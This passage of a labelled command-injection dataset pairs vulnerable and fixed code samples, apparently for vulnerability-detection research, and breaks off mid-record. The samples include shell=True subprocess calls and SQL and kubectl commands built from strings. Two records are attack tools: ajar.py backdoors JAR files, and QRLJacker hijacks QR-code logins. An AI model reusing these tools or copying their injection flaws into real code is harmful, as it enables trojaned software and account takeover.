'0'\n\n        cliq_args['volumeName'] = volume['name']\n        if int(volume['size']) == 0:\n            cliq_args['size'] = '100MB'\n        else:\n            cliq_args['size'] = '%sGB' % volume['size']\n\n        self._cliq_run_xml(\"createVolume\", cliq_args)\n\n        volume_info = self._cliq_get_volume_info(volume['name'])\n        cluster_name = volume_info['volume.clusterName']\n        iscsi_iqn = volume_info['volume.iscsiIqn']\n\n        #TODO(justinsb): Is this always 1? Does it matter?\n        cluster_interface = '1'\n\n        if not self.cluster_vip:\n            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)\n        iscsi_portal = self.cluster_vip + \":3260,\" + cluster_interface\n\n        model_update = {}\n\n        # NOTE(jdg): LH volumes always at lun 0 ?\n        model_update['provider_location'] = (\"%s %s %s\" %\n                                             (iscsi_portal,\n                                              iscsi_iqn,\n                                              0))\n\n        return model_update\n\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"Creates a volume from a snapshot.\"\"\"\n        raise NotImplementedError()\n\n    def create_snapshot(self, snapshot):\n        \"\"\"Creates a snapshot.\"\"\"\n        raise NotImplementedError()\n\n    def delete_volume(self, volume):\n        \"\"\"Deletes a volume.\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['prompt'] = 'false'  # Don't confirm\n        try:\n            volume_info = self._cliq_get_volume_info(volume['name'])\n        except exception.ProcessExecutionError:\n            LOG.error(\"Volume did not exist. It will not be deleted\")\n            return\n        self._cliq_run_xml(\"deleteVolume\", cliq_args)\n\n    def local_path(self, volume):\n        msg = _(\"local_path not supported\")\n        raise exception.VolumeBackendAPIException(data=msg)\n\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host. HP VSA requires a volume to be assigned\n        to a server.\n\n        This driver returns a driver_volume_type of 'iscsi'.\n        The format of the driver data is defined in _get_iscsi_properties.\n        Example return value:\n\n            {\n                'driver_volume_type': 'iscsi'\n                'data': {\n                    'target_discovered': True,\n                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',\n                    'target_protal': '127.0.0.1:3260',\n                    'volume_id': 1,\n                }\n            }\n\n        \"\"\"\n        self._create_server(connector)\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['serverName'] = connector['host']\n        self._cliq_run_xml(\"assignVolumeToServer\", cliq_args)\n\n        iscsi_properties = self._get_iscsi_properties(volume)\n        return {\n            'driver_volume_type': 'iscsi',\n            'data': iscsi_properties\n        }\n\n    def _create_server(self, connector):\n        cliq_args = {}\n        cliq_args['serverName'] = connector['host']\n        out = self._cliq_run_xml(\"getServerInfo\", cliq_args, False)\n        response = out.find(\"response\")\n        result = response.attrib.get(\"result\")\n        if result != '0':\n            cliq_args = {}\n            cliq_args['serverName'] = connector['host']\n            cliq_args['initiator'] = connector['initiator']\n            self._cliq_run_xml(\"createServer\", cliq_args)\n\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Unassign the volume from the host.\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['serverName'] = connector['host']\n        self._cliq_run_xml(\"unassignVolumeToServer\", cliq_args)\n\n    def get_volume_stats(self, refresh):\n        if refresh:\n            self._update_backend_status()\n\n        return self.device_stats\n\n    def _update_backend_status(self):\n        data = {}\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        data['volume_backend_name'] = backend_name or self.__class__.__name__\n        data['driver_version'] = '1.0'\n        data['reserved_percentage'] = 0\n        data['storage_protocol'] = 'iSCSI'\n        data['vendor_name'] = 'Hewlett-Packard'\n\n        result_xml = self._cliq_run_xml(\"getClusterInfo\", {})\n        cluster_node = result_xml.find(\"response/cluster\")\n        total_capacity = cluster_node.attrib.get(\"spaceTotal\")\n        free_capacity = cluster_node.attrib.get(\"unprovisionedSpace\")\n        GB = 1073741824\n\n        data['total_capacity_gb'] = int(total_capacity) / GB\n        data['free_capacity_gb'] = int(free_capacity) / GB\n        self.device_stats = data\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "5ed8aba271ad20e6168f2e3bd6c25ba89b84484f", "code": "ajar.py/n/nimport zipfile, os, subprocess, shutil, sys, getopt, re\n\nbackdoor = target = None\noutfile = \"backdoor.jar\"\n\ndef main(argv):\n    global backdoor, target, outfile\n    help = 0\n    try:\n        opts, args = getopt.getopt(argv, \"b:t:o:\", [\"backdoor=\", \"target=\", \"outfile=\"])\n    except getopt.GetoptError:\n        print('USAGE:\\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')\n        sys.exit(2)\n    for opt, arg in opts:\n        if opt == '-h':\n            help = 1\n            print('USAGE:\\tajar.py')\n        elif opt in (\"-b\", \"--backdoor\"):\n            backdoor = arg\n        elif opt in (\"-t\", \"--target\"):\n            target = arg\n        elif opt in (\"-o\", \"--outfile\"):\n            outfile = arg\n            \n    if (backdoor != None) & (target != None):\n        try:\n            start()\n        except:\n            print('[!] An error ocurred:\\n')\n            for e in sys.exc_info():\n                print(e)\n    elif help != 1:\n        print('USAGE:\\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')\n\ndef createZip(src, dst):\n    zf = zipfile.ZipFile(\"%s\" % (dst), \"w\")\n    abs_src = os.path.abspath(src)\n    for dirname, subdirs, files in os.walk(src):\n        for filename in files:\n            if filename != backdoor:\n                absname = os.path.abspath(os.path.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                #print('[*] jaring %s as %s' % (os.path.join(dirname, filename), arcname))\n                zf.write(absname, arcname)\n    zf.close()\n        \ndef start():\n    print(\"[*] Starting backdoor process\")\n    print(\"[*] Decompressing target to tmp directory...\")\n    #subprocess.call(\"jar -x %s\" % target, shell=True)\n    with zipfile.ZipFile(target, 'r') as zip:\n        zip.extractall(\"tmp\")\n    print(\"[*] Target dumped to tmp directory\")\n\n    print(\"[*] Modifying manifest file...\")\n    oldmain=\"\"\n    man = open(\"tmp/META-INF/MANIFEST.MF\",\"r\").read()\n    with open(\"tmp/META-INF/MANIFEST.MF\",\"w\") as f:\n        for l in man.split(\"\\n\"):\n            if \"Main-Class\" in l:\n                oldmain=l[12:]\n                f.write(\"Main-Class: %s\\n\" % \"Backdoor\")\n            else:\n                f.write(\"%s\\n\" % l)\n    print(\"[*] Manifest file modified\")\n    \n    print(\"[*] Modifying provided backdoor...\")\n    inmain=False\n    level=0\n    bd=open(backdoor, \"r\").read()\n    with open(\"tmp/%s\" % backdoor,'w') as f:\n        for l in bd.split(\"\\n\"):\n            if \"main(\" in l:\n                inmain=True\n                f.write(l)\n            elif \"}\" in l and level<2 and inmain:\n                f.write(\"%s.main(args);}\" % oldmain)\n                inmain=False\n            elif \"}\" in l and level>1 and inmain:\n                level-=1\n                f.write(l)\n            elif \"{\" in l and inmain:\n                level+=1\n                f.write(l)\n            else:\n                f.write(l)\n    print(\"[*] Provided backdoor successfully modified\")\n\n    print(\"[*] Compiling modified backdoor...\")\n    #if subprocess.call(\"javac -cp tmp/ tmp/%s\" % backdoor, shell=True) != 0:\n    if subprocess.call(['javac','-cp','tmp/','tmp/%s'%backdoor],shell=False) != 0:\n        print(\"[!] Error compiling %s\" % backdoor)\n    print(\"[*] Compiled modified backdoor\")\n                \n    if(len(oldmain)<1):\n        print(\"[!] Main-Class manifest attribute not found\")\n    else:\n        print(\"[*] Repackaging target jar file...\")\n        createZip(\"tmp\",outfile)\n        print(\"[*] Target jar successfully repackaged\")\n    shutil.rmtree('tmp/')\n    \nif __name__ == \"__main__\":\n    main(sys.argv[1:])\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "5ed8aba271ad20e6168f2e3bd6c25ba89b84484f", "code": "/ajar.py/n/nimport zipfile, os, subprocess, shutil, sys, getopt, re\n\nbackdoor = target = None\noutfile = \"backdoor.jar\"\n\ndef main(argv):\n    global backdoor, target, outfile\n    help = 0\n    try:\n        opts, args = getopt.getopt(argv, \"b:t:o:\", [\"backdoor=\", \"target=\", \"outfile=\"])\n    except getopt.GetoptError:\n        print('USAGE:\\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')\n        sys.exit(2)\n    for opt, arg in opts:\n        if opt == '-h':\n            help = 1\n            print('USAGE:\\tajar.py')\n        elif opt in (\"-b\", \"--backdoor\"):\n            backdoor = arg\n        elif opt in (\"-t\", \"--target\"):\n            target = arg\n        elif opt in (\"-o\", \"--outfile\"):\n            outfile = arg\n            \n    if (backdoor != None) & (target != None):\n        try:\n            start()\n        except:\n            print('[!] An error ocurred:\\n')\n            for e in sys.exc_info():\n                print(e)\n    elif help != 1:\n        print('USAGE:\\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')\n\ndef createZip(src, dst):\n    zf = zipfile.ZipFile(\"%s\" % (dst), \"w\")\n    abs_src = os.path.abspath(src)\n    for dirname, subdirs, files in os.walk(src):\n        for filename in files:\n            if filename != backdoor:\n                absname = os.path.abspath(os.path.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                #print('[*] jaring %s as %s' % (os.path.join(dirname, filename), arcname))\n                zf.write(absname, arcname)\n    zf.close()\n        \ndef start():\n    print(\"[*] Starting backdoor process\")\n    print(\"[*] Decompressing target to tmp directory...\")\n    #subprocess.call(\"jar -x %s\" % target, shell=True)\n    with zipfile.ZipFile(target, 'r') as zip:\n        zip.extractall(\"tmp\")\n    print(\"[*] Target dumped to tmp directory\")\n\n    print(\"[*] Modifying manifest file...\")\n    oldmain=\"\"\n    man = open(\"tmp/META-INF/MANIFEST.MF\",\"r\").read()\n    with open(\"tmp/META-INF/MANIFEST.MF\",\"w\") as f:\n        for l in man.split(\"\\n\"):\n            if \"Main-Class\" in l:\n                oldmain=l[12:]\n                f.write(\"Main-Class: %s\\n\" % \"Backdoor\")\n            else:\n                f.write(\"%s\\n\" % l)\n    print(\"[*] Manifest file modified\")\n    \n    print(\"[*] Modifying provided backdoor...\")\n    inmain=False\n    level=0\n    bd=open(backdoor, \"r\").read()\n    with open(\"tmp/%s\" % backdoor,'w') as f:\n        for l in bd.split(\"\\n\"):\n            if \"main(\" in l:\n                inmain=True\n                f.write(l)\n            elif \"}\" in l and level<2 and inmain:\n                f.write(\"%s.main(args);}\" % oldmain)\n                inmain=False\n            elif \"}\" in l and level>1 and inmain:\n                level-=1\n                f.write(l)\n            elif \"{\" in l and inmain:\n                level+=1\n                f.write(l)\n            else:\n                f.write(l)\n    print(\"[*] Provided backdoor successfully modified\")\n\n    print(\"[*] Compiling modified backdoor...\")\n    if subprocess.call(\"javac -cp tmp/ tmp/%s\" % backdoor, shell=True) != 0:\n        print(\"[!] Error compiling %s\" % backdoor)\n    print(\"[*] Compiled modified backdoor\")\n                \n    if(len(oldmain)<1):\n        print(\"[!] Main-Class manifest attribute not found\")\n    else:\n        print(\"[*] Repackaging target jar file...\")\n        createZip(\"tmp\",outfile)\n        print(\"[*] Target jar successfully repackaged\")\n    shutil.rmtree('tmp/')\n    \nif __name__ == \"__main__\":\n    main(sys.argv[1:])\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "5a27336fbe3c220455a015f1bdc2621621f4bf40", "code": "Server/model.py/n/nimport sqlalchemy\nfrom sqlalchemy import text\nfrom sqlalchemy.orm import sessionmaker, scoped_session\n\nengine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')\nSession = scoped_session(sessionmaker(bind=engine))\n\ndef select_all_apps():\n\treturn s.execute(\"SELECT * FROM apps\").fetchall()\n\ndef select_all_apps_from_user(user_id):\n\treturn s.execute(\"SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?\", user_id)\n\ndef select_all_devices_from_user(user_id):\n\treturn s.execute(\"SELECT * FROM devices WHERE user_id=?\", user_id)/n/n/nServer/mysql_commands.py/n/nimport sqlalchemy\nfrom sqlalchemy import text\nfrom sqlalchemy.orm import sessionmaker, scoped_session\n\nengine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')\nSession = scoped_session(sessionmaker(bind=engine))\n\ns = Session()\n\ndef select_row_from_mysql_command(command_str):\n    ''' function for selecting a specific row  '''\n    ''' OUPUT: a list of elements in the selected row '''\n\n    sql = text(str(command_str))\n    return s.execute(sql).fetchall()\n\n\ndef insert_into_mysql_command(command_str):\n        ''' the function inserts data depending from a command_str '''\n\n        sql = text(str(command_str))\n        s.execute(sql)\n        s.commit()\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "5a27336fbe3c220455a015f1bdc2621621f4bf40", "code": "/Server/model.py/n/nfrom mysql_commands import *\n\ndef select_all_apps():\n\treturn select_row_from_mysql_command(\"SELECT * FROM apps\")\n\ndef select_all_apps_from_user(user_id):\n\treturn select_row_from_mysql_command(\"SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?\", user_id)\n\ndef select_all_devices_from_user(user_id):\n\treturn select_row_from_mysql_command(\"SELECT * FROM devices WHERE user_id=?\", user_id)/n/n/n/Server/mysql_commands.py/n/nimport sqlalchemy\nfrom sqlalchemy import text\nfrom sqlalchemy.orm import sessionmaker, scoped_session\n\nengine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')\nSession = scoped_session(sessionmaker(bind=engine))\n\ns = Session()\n\ndef select_row_from_mysql_command(command_str):\n    ''' function for selecting a specific row  '''\n    ''' OUPUT: a list of elements in the selected row '''\n\n    sql = text(str(command_str))\n    return s.execute(sql).fetchall()\n\n\ndef insert_into_mysql_command(command_str):\n        ''' the function inserts data depending from a command_str '''\n\n        sql = text(str(command_str))\n        s.execute(sql)\n        s.commit()\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "82d92836d4ff78c623a0e06302c94cfa5ff79908", "code": "tests/post/steps/test_dns.py/n/nimport os\n\nfrom kubernetes import client, config\nimport pytest\nfrom pytest_bdd import scenario, then, parsers\nimport yaml\n\nfrom tests import utils\n\n\n@pytest.fixture\ndef busybox_pod(kubeconfig):\n    config.load_kube_config(config_file=kubeconfig)\n    k8s_client = client.CoreV1Api()\n\n    # Create the busybox pod\n    pod_manifest = os.path.join(\n        os.path.realpath(os.path.dirname(__file__)),\n        \"files\",\n        \"busybox.yaml\"\n    )\n    with open(pod_manifest, encoding='utf-8') as pod_fd:\n        pod_manifest_content = yaml.safe_load(pod_fd)\n\n    k8s_client.create_namespaced_pod(\n        body=pod_manifest_content, namespace=\"default\"\n    )\n\n    # Wait for the busybox to be ready\n    def _check_status():\n        pod_info = k8s_client.read_namespaced_pod(\n            name=\"busybox\",\n            namespace=\"default\",\n        )\n        assert pod_info.status.phase == \"Running\", (\n            \"Wrong status for 'busybox' Pod - found {status}\"\n        ).format(status=pod_info.status.phase)\n\n    utils.retry(_check_status, times=10)\n\n    yield \"busybox\"\n\n    # Clean-up resources\n    k8s_client.delete_namespaced_pod(\n        name=\"busybox\",\n        namespace=\"default\",\n        body=client.V1DeleteOptions(),\n    )\n\n\n# Scenarios\n@scenario('../features/dns_resolution.feature', 'check DNS')\ndef test_dns(host):\n    pass\n\n\n@then(parsers.parse(\"the hostname '{hostname}' should be resolved\"))\ndef resolve_hostname(busybox_pod, host, hostname):\n    with host.sudo():\n        # test dns resolve\n        result = host.run(\n            \"kubectl --kubeconfig=/etc/kubernetes/admin.conf \"\n            \"exec -ti %s nslookup %s\",\n            busybox_pod,\n            hostname,\n        )\n\n        assert result.rc == 0, \"Cannot resolve {}\".format(hostname)\n/n/n/ntests/post/steps/test_liveness.py/n/nimport json\nimport time\n\nimport pytest\nfrom pytest_bdd import scenario, then, parsers\n\nfrom tests import kube_utils\nfrom tests import utils\n\n\n# Scenarios\n@scenario('../features/pods_alive.feature', 'List Pods')\ndef test_list_pods(host):\n    pass\n\n\n@scenario('../features/pods_alive.feature', 'Exec in Pods')\ndef test_exec_in_pods(host):\n    pass\n\n\n@scenario('../features/pods_alive.feature', 'Expected Pods')\ndef test_expected_pods(host):\n    pass\n\n\n# Then\n@then(parsers.parse(\n    \"the '{resource}' list should not be \"\n    \"empty in the '{namespace}' namespace\"))\ndef check_resource_list(host, resource, namespace):\n    with host.sudo():\n        output = host.check_output(\n            \"kubectl --kubeconfig=/etc/kubernetes/admin.conf \"\n            \"get %s --namespace %s -o custom-columns=:metadata.name\",\n            resource,\n            namespace,\n        )\n\n    assert len(output.strip()) > 0, 'No {0} found in namespace {1}'.format(\n            resource, namespace)\n\n\n@then(parsers.parse(\n    \"we can exec '{command}' in the pod labeled '{label}' \"\n    \"in the '{namespace}' namespace\"))\ndef check_exec(host, command, label, namespace):\n    candidates = kube_utils.get_pods(host, label, namespace)\n\n    assert len(candidates) == 1, (\n        \"Expected one (and only one) pod with label {l}, found {f}\"\n    ).format(l=label, f=len(candidates))\n\n    pod = candidates[0]\n\n    with host.sudo():\n        host.check_output(\n            'kubectl --kubeconfig=/etc/kubernetes/admin.conf '\n            'exec --namespace %s %s %s',\n            namespace,\n            pod['metadata']['name'],\n            command,\n        )\n\n\n@then(parsers.parse(\n    \"we have at least {min_pods_count:d} running pod labeled '{label}'\"))\ndef count_running_pods(host, min_pods_count, label):\n    def _check_pods_count():\n        pods = kube_utils.get_pods(\n            host,\n            label,\n            namespace=\"kube-system\",\n            status_phase=\"Running\",\n        )\n\n        assert len(pods) >= min_pods_count\n\n    utils.retry(_check_pods_count, times=10, wait=3)\n/n/n/ntests/post/steps/test_logs.py/n/nfrom pytest_bdd import scenario, then\n\n# Scenarios\n@scenario('../features/log_accessible.feature', 'get logs')\ndef test_logs(host):\n    pass\n\n\n@then(\"the pods logs should not be empty\")\ndef check_logs(host):\n    with host.sudo():\n        pods_list = host.check_output(\n            'kubectl --kubeconfig=/etc/kubernetes/admin.conf '\n            'get pods -n kube-system '\n            '--no-headers -o custom-columns=\":metadata.name\"'\n        )\n        for pod_id in pods_list.split('\\n'):\n            pod_logs = host.check_output(\n                'kubectl --kubeconfig=/etc/kubernetes/admin.conf '\n                'logs %s --limit-bytes=1 -n kube-system',\n                pod_id,\n            )\n\n            if 'salt-master' not in pod_id:\n                assert len(pod_logs.strip()) > 0, (\n                    'Error cannot retrieve logs for {}'.format(pod_id))\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "82d92836d4ff78c623a0e06302c94cfa5ff79908", "code": "/tests/post/steps/test_dns.py/n/nimport os\n\nfrom kubernetes import client, config\nimport pytest\nfrom pytest_bdd import scenario, then, parsers\nimport yaml\n\nfrom tests import utils\n\n\n@pytest.fixture\ndef busybox_pod(kubeconfig):\n    config.load_kube_config(config_file=kubeconfig)\n    k8s_client = client.CoreV1Api()\n\n    # Create the busybox pod\n    pod_manifest = os.path.join(\n        os.path.realpath(os.path.dirname(__file__)),\n        \"files\",\n        \"busybox.yaml\"\n    )\n    with open(pod_manifest, encoding='utf-8') as pod_fd:\n        pod_manifest_content = yaml.safe_load(pod_fd)\n\n        k8s_client.create_namespaced_pod(\n        body=pod_manifest_content, namespace=\"default\"\n    )\n\n    # Wait for the busybox to be ready\n    def _check_status():\n        pod_info = k8s_client.read_namespaced_pod(\n            name=\"busybox\",\n            namespace=\"default\",\n        )\n        assert pod_info.status.phase == \"Running\", (\n            \"Wrong status for 'busybox' Pod - found {status}\"\n        ).format(status=pod_info.status.phase)\n\n    utils.retry(_check_status, times=10)\n\n    yield \"busybox\"\n\n    # Clean-up resources\n    k8s_client.delete_namespaced_pod(\n        name=\"busybox\",\n        namespace=\"default\",\n        body=client.V1DeleteOptions(),\n    )\n\n\n# Scenarios\n@scenario('../features/dns_resolution.feature', 'check DNS')\ndef test_dns(host):\n    pass\n\n\n@then(parsers.parse(\"the hostname '{hostname}' should be resolved\"))\ndef resolve_hostname(busybox_pod, host, hostname):\n        with host.sudo():\n            # test dns resolve\n            cmd_nslookup = (\"kubectl --kubeconfig=/etc/kubernetes/admin.conf\"\n                            \" exec -ti {0} nslookup {1}\".format(\n                                pod_name,\n                                hostname))\n            res = host.run(cmd_nslookup)\n            assert res.rc == 0, \"Cannot resolve {}\".format(hostname)\n/n/n/n/tests/post/steps/test_liveness.py/n/nimport json\nimport time\n\nimport pytest\nfrom pytest_bdd import scenario, then, parsers\n\nfrom tests import kube_utils\nfrom tests import utils\n\n\n# Scenarios\n@scenario('../features/pods_alive.feature', 'List Pods')\ndef test_list_pods(host):\n    pass\n\n\n@scenario('../features/pods_alive.feature', 'Exec in Pods')\ndef test_exec_in_pods(host):\n    pass\n\n\n@scenario('../features/pods_alive.feature', 'Expected Pods')\ndef test_expected_pods(host):\n    pass\n\n\n# Then\n@then(parsers.parse(\n    \"the '{resource}' list should not be \"\n    \"empty in the '{namespace}' namespace\"))\ndef check_resource_list(host, resource, namespace):\n    with host.sudo():\n        cmd = (\"kubectl --kubeconfig=/etc/kubernetes/admin.conf\"\n               \" get {0} --namespace {1} -o custom-columns=:metadata.name\")\n        cmd_res = host.check_output(cmd.format(resource, namespace))\n    assert len(cmd_res.strip()) > 0, 'No {0} found in namespace {1}'.format(\n            resource, namespace)\n\n\n@then(parsers.parse(\n    \"we can exec '{command}' in the pod labeled '{label}' \"\n    \"in the '{namespace}' namespace\"))\ndef check_exec(host, command, label, namespace):\n    candidates = kube_utils.get_pods(host, label, namespace)\n\n    assert len(candidates) == 1, (\n        \"Expected one (and only one) pod with label {l}, found {f}\"\n    ).format(l=label, f=len(candidates))\n\n    pod = candidates[0]\n\n    cmd = ' '.join([\n        'kubectl',\n        '--kubeconfig=/etc/kubernetes/admin.conf',\n        'exec',\n        '--namespace {0}'.format(namespace),\n            pod['metadata']['name'],\n            command,\n    ])\n\n    with host.sudo():\n        host.check_output(cmd)\n\n\n@then(parsers.parse(\n    \"we have at least {min_pods_count:d} running pod labeled '{label}'\"))\ndef count_running_pods(host, min_pods_count, label):\n    def _check_pods_count():\n        pods = kube_utils.get_pods(\n            host,\n            label,\n            namespace=\"kube-system\",\n            status_phase=\"Running\",\n        )\n\n        assert len(pods) >= min_pods_count\n\n    utils.retry(_check_pods_count, times=10, wait=3)\n/n/n/n/tests/post/steps/test_logs.py/n/nfrom pytest_bdd import scenario, then\n\n# Scenarios\n@scenario('../features/log_accessible.feature', 'get logs')\ndef test_logs(host):\n    pass\n\n\n@then(\"the pods logs should not be empty\")\ndef check_logs(host):\n    with host.sudo():\n        cmd = ('kubectl --kubeconfig=/etc/kubernetes/admin.conf'\n               ' get pods -n kube-system'\n               ' --no-headers -o custom-columns=\":metadata.name\"')\n        pods_list = host.check_output(cmd)\n        for pod_id in pods_list.split('\\n'):\n            cmd_logs = ('kubectl --kubeconfig=/etc/kubernetes/admin.conf'\n                        ' logs {} --limit-bytes=1 -n kube-system'.format(\n                            pod_id))\n            res = host.check_output(cmd_logs)\n            if 'salt-master' not in pod_id:\n                assert len(res.strip()) > 0, (\n                    'Error cannot retrieve logs for {}'.format(pod_id))\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "a101472db88764a0d031ef85fa283967b0692a77", "code": "QrlJacking-Framework/QRLJacker.py/n/n#!/usr/bin/env python\n#-*- encoding:utf-8 -*-\n#Author:D4Vinci\nimport base64 ,time ,os ,urllib ,sys ,threading ,configparser\nfrom binascii import a2b_base64\n\ndef clear():\n\tif os.name == \"nt\":\n\t\tos.system(\"cls\")\n\telse:\n\t\tos.system(\"clear\")\n\ntry:\n\tfrom PIL import Image\n\timport selenium\n\tfrom selenium import webdriver\n\nexcept:\n\tprint \"[!] Error Importing Exterinal Libraries\"\n\tprint \"[!] Trying to install it using pip\"\n\ttry:\n\t\tos.popen(\"python -m pip install selenium\")\n\t\tos.popen(\"python -m pip install Pillow\")\n\texcept:\n\t\ttry:\n\t\t\tos.popen(\"pip install selenium\")\n\t\t\tos.popen(\"pip install Pillow\")\n\t\texcept:\n\t\t\tprint \"[!] Can't install libraries \"\n\t\t\tprint \"[!!] Try to install it yourself\"\n\t\t\texit(0)\n\nfinally:\n\tclear()\n\tfrom PIL import Image\n\timport selenium\n\tfrom selenium import webdriver\n\n#settings = configparser.ConfigParser()\n\ndef Serve_it(port=1337):\n\tdef serve(port):\n\t\tif os.name==\"nt\":\n\t\t\tprint \" [!] Serving files on \"+str(port)+\" port\"\n\t\t\tos.popen(\"python -m SimpleHTTPServer \"+str(port)+\" > NUL 2>&1\")\n\t\telse:\n\t\t\tprint \" [!] Serving files on \"+str(port)+\" port\"\n\t\t\tos.popen(\"python -m SimpleHTTPServer \"+str(port)+\" > /dev/null 2>&1\")\n\tthreading.Thread(target=serve,args=(port,)).start()\n\ndef create_driver():\n\ttry:\n\t\tweb = webdriver.Firefox()\n\t\tprint \" [+]Opening Mozila FireFox...\"\n\t\treturn web\n\texcept:\n\t\ttry:\n\t\t\tweb = webdriver.Chrome()\n\t\t\tprint \" [+]Opening Google Chrome...\"\n\t\t\treturn web\n\t\texcept:\n\t\t\ttry:\n\t\t\t\tweb = webdriver.Opera()\n\t\t\t\tprint \" [+]Opening Opera...\"\n\t\t\t\treturn web\n\t\t\texcept:\n\t\t\t\ttry:\n\t\t\t\t\tweb = webdriver.Edge()\n\t\t\t\t\tprint \" [+]Opening Edge...\"\n\t\t\t\t\treturn web\n\t\t\t\texcept:\n\t\t\t\t\ttry:\n\t\t\t\t\t\tweb = webdriver.Ie()\n\t\t\t\t\t\tprint \" [+]Opening Internet Explorer...\"\n\t\t\t\t\t\treturn web\n\t\t\t\t\texcept:\n\t\t\t\t\t\tprint \" Error : \\n Can not call webbrowsers\\n  Check your pc\"\n\t\t\t\t\t\texit(0)\n\n#Stolen from stackoverflow :D\ndef Screenshot(PicName ,location ,size):\n\timg = Image.open(PicName)#screenshot.png\n\tleft = location['x']\n\ttop = location['y']\n\tright = left + size['width']\n\tbottom = top + size['height']\n\tbox = (int(left), int(top), int(right), int(bottom))\n\tfinal = img.crop(box) # defines crop points\n\tfinal.load()\n\tfinal.save(PicName)\n\ndef whatsapp():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get('https://web.whatsapp.com/')\n\ttime.sleep(5)\n\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\tbutton = driver.find_element_by_class_name('qr-button')\n\t\t\tprint \" [!]Clicking to reload QR code image...\"\n\t\t\tbutton._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)\n\t\t\ttime.sleep(5)\n\t\texcept:\n\t\t\tpass\n\n\t\ttry:\n\t\t\timg = driver.find_elements_by_tag_name('img')[0]\n\t\t\tsrc = img.get_attribute('src').replace(\"data:image/png;base64,\",\"\")\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tbinary_data = a2b_base64(src)\n\t\t\tqr = open(\"tmp.png\",\"wb\")\n\t\t\tqr.write(binary_data)\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\tqr.close()\n\t\t\ttime.sleep(5)\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\n#make(\"svg\")\ndef Yandex():\n\tprint \"\\n-- --- -- --- -- --- -- --- -- --- --\"\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"https://passport.yandex.com/auth?mode=qr\")\n\ttime.sleep(5)\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\timg_url = \"https://passport.yandex.com\" + driver.find_element_by_class_name(\"qr-code__i\").get_attribute(\"style\").split(\"\\\"\")[1].encode(\"utf-8\")\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tdata = urllib.urlopen(img_url).read()\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tf = open(\"tmp.svg\",\"w\").write(data)\n\t\t\tprint \" [#]Saved To tmp.svg\"\n\t\t\ttime.sleep(10)\n\t\t\tprint \" [!]Refreshing page...\"\n\t\t\tdriver.refresh()\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef Airdroid():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"http://web.airdroid.com\")\n\ttime.sleep(5)\n\timg_number = 16\n\trefresh = 0\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\tbutton = driver.find_element_by_class_name(\"widget-login-refresh-qrcode\")[0]\n\t\t\tprint \" [!]Clicking to reload QR code image...\"\n\t\t\tbutton._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)\n\t\t\ttime.sleep(5)\n\t\texcept:\n\t\t\tpass\n\t\ttry:\n\t\t\timgs = driver.find_elements_by_tag_name('img')\n\t\t\timg = imgs[img_number]\n\t\t\tprint \" [+]The QR code image found !\"\n\t\t\tsrc = img.get_attribute('src')\n\t\t\tprint \" [+]Downloading the image..\"\n\t\t\tqr = urllib.urlretrieve(src, \"tmp.png\")\n\t\t\tprint \" [#]Saved To tmp.png\"\n\t\t\ttime.sleep(10)\n\t\t\tif refresh == 0:\n\t\t\t\tprint \" [!]Refreshing page...\"\n\t\t\t\tdriver.refresh()\n\t\t\t\trefresh = 1\n\t\t\timg_number = 15\n\t\t\tcontinue\n\t\texcept:\n\t\t\tbreak\n\ndef Weibo():\n\tdriver = create_driver()\n\ttime.sleep(5)\n\tprint \" [+]Navigating To Website..\"\n\tdriver.get(\"http://weibo.com/login.php\")\n\ttime.sleep(5)\n\twhile True:\n\t\tprint \"-- --- -- --- -- --- -- --- -- --- --\"\n\t\ttry:\n\t\t\timgs = driver.find_elements_by_tag_name('img')\n\t\t\timg = 